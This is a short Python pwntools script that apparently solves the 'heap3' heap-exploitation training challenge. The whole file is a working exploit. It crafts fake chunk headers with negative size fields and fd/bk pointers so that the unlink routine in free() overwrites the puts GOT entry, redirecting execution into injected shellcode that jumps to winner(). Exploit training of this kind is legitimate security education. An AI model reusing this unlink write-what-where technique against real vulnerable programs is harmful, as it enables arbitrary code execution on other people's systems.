from pwn import *

_winner = p32(0x08048864)           # winner() address
_jmp_winner_asm = asm("""mov eax, 0x08048864; jmp eax""")
_got_puts_addr = 0x0804b128         # puts .got

arg1 = b"\x90" * 4               # first chunk will be freed, hence this
arg1 += _jmp_winner_asm          # shellcode for jumping to winner()

# (gdb) p 0x804c050 - 0x804c030
# $1 = 32
arg2 = b"A" * 32
arg2 += p32(0xfffffff8)          # prev_size set to -8
arg2 += p32(0xfffffffc)          # keep in mind last three bits A|M|P
arg2 += b"header12"              # 8 byte fake chunk header
arg2 += p32(_got_puts_addr - 12) # fd pointing to puts .got - 12
arg2 += p32(0x0804c00c)          # bk pointing to _jmp_winner_asm in first chunk

arg3 = b"junk"                   # will overwrite our fake prev_size, not relevant

p = process(['./heap3', arg1, arg2, arg3], env={'LD_PRELOAD': './libc.so.6'})
p.interactive()

